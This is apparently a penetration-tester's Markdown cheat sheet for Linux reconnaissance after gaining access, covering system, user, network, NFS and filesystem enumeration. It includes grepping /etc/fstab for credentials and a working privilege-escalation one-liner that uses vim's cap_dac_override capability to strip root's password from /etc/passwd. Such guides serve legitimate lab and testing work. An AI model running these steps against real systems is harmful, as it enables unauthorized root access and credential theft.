# Linux Reconnaissance
`The Guide`

- [Environment Enumeration](#environment-enumeration)
  - [Drives and Shares](#drives-and-shares)
  - [Routing Tables](#routing-tables)
  - [Enumerating Users](#enumerating-users)
- [Capabilities]()
- [Network File System - NFS](#network-file-system)
- [Find](#find)


## Environment Enumeration
### Basic
| CMD | EXPLAIN |
|-----|---------|
| `whoami` | what user are we running as |
| `id` | what groups does our user belong to? |
| `hostname` | what is the server named. can we gather anything from the naming convention? |
| `ifconfig` or `ip -a` | what subnet did we land in, does the host have additional NICs in other subnets? |
| `sudo -l` | can our user run anything with `sudo` (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like sudo su and drop right into a root shell. |

> Operating system and version.
```bash
cat /etc/os-release
```
> `id` location
```bash
echo $PATH
```
> Environment Variables
```bash
env
```
> Kernel version
```bash
uname -a
```
> CPU type/version.
```bash
lscpu 
```
> What login shells exist on the server?
```bash
cat /etc/shells
```

We should also check to see if any defenses are in place and we can enumerate any information about them. Some things to look for include:

- [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
- [iptables](https://linux.die.net/man/8/iptables)
- [AppArmor](https://apparmor.net/)
- [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
- [Fail2ban](https://github.com/fail2ban/fail2ban)
- [Snort](https://www.snort.org/faq/what-is-snort)
- [Uncomplicated Firewall (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall)

### Drives and Shares
```bash
lsblk

NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0                       7:0    0   55M  1 loop /snap/core18/1705
loop1                       7:1    0   69M  1 loop /snap/lxd/14804
loop2                       7:2    0   47M  1 loop /snap/snapd/16292
loop3                       7:3    0  103M  1 loop /snap/lxd/23339
loop4                       7:4    0   62M  1 loop /snap/core20/1587
loop5                       7:5    0 55.6M  1 loop /snap/core18/2538
sda                         8:0    0   20G  0 disk 
├─sda1                      8:1    0    1M  0 part 
├─sda2                      8:2    0    1G  0 part /boot
└─sda3                      8:3    0   19G  0 part 
  └─ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /
sr0                        11:0    1  908M  0 rom 
```
> The command `lpstat` can be used to find information about any printers attached to the system.  

> We should also checked for mounted drives and unmounted drives. Can we mount an umounted drive and gain access to sensitive data? Can we find any types of credentials in `fstab` for mounted drives by grepping for common words such as password, username, credential, etc in `/etc/fstab`?
```bash
cat /etc/fstab

# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation
/dev/disk/by-id/dm-uuid-LVM-BdLsBLE4CvzJUgtkugkof4S0dZG7gWR8HCNOlRdLWoXVOba2tYUMzHfFQAP9ajul / ext4 defaults 0 0
# /boot was on /dev/sda2 during curtin installation
/dev/disk/by-uuid/20b1770d-a233-4780-900e-7c99bc974346 /boot ext4 defaults 0 0
```

> **Mounted File Systems**
```bash
df -h
```

> **Unmounted File Systems**
```bash
cat /etc/fstab | grep -v "#" | column -t
```

> **All Hidden Files**
```bash
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
```
> **All Hidden Directories**
```bash
find / -type d -name ".*" -ls 2>/dev/null
```

> **Temporary Files**
```bash
ls -l /tmp /var/tmp /dev/shm
```


### Routing Tables
`route` or `netstat -rn`
```bash
route

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         _gateway        0.0.0.0         UG    0      0        0 ens192
10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192
```

> In a domain environment we'll definitely want to check `/etc/resolv.conf` if the host is configured to use internal DNS we may be able to use this as a starting point to query the Active Directory environment.

We'll also want to check the arp table to see what other hosts the target has been communicating with.
```bash
arp -a
_gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192
```

### Enumerating Users
```bash
cat /etc/passwd | cut -f1 -d:
```

> Login shells
```bash
grep "*sh$" /etc/passwd
```

> Existing groups
```bash
cat /etc/group
```

> We can then use the [getent](https://man7.org/linux/man-pages/man1/getent.1.html) command to list members of any interesting groups.
```bash
getent group sudo  

sudo:x:27:mrb3n
```

---
## Capabilities
Enumerating Capabilities
```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
Exploiting Capabilities
```bash
getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```
```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```
> Now, we can see that the x in that line is gone, which means that we can use the command su to log in as root without being asked for the password.



### Several LINUX hash algorithms
![several-linux-hash](/media/several-linux-hashes.png)

---
## Network File System
NFS export list.
```bash
showmount --exports 10.10.10.2
```
Mounting directory
```bash
sudo mount -t nfs 10.10.0.10:/backups /var/backups
```
> Where 10.10.0.10 is the IP address of the NFS server, /backup is the directory that the server is exporting and /var/backups is the local mount point.

## Find
```bash
find / -type f -user svc_acc 2>/dev/null
```